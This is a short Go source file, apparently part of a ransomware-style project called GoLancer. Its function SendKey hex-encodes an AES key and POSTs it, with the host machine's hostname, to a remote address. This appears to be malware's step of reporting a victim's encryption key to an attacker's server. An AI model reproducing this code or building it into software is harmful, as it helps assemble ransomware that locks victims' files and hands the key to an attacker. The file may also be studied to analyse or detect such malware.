package webhelper

import (
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"

	"github.com/WesEfird/GoLancer/sysinfo"
)

func SendKey(aesKey []byte, addr string) error {
	encodedBytes := hex.EncodeToString(aesKey)

	data := url.Values{
		"host": {sysinfo.GetInfo().Hostname},
		"key":  {encodedBytes},
	}

	resp, err := http.PostForm(addr, data)
	if err != nil {
		return err
	}

	fmt.Println(resp.Status)

	return nil
}
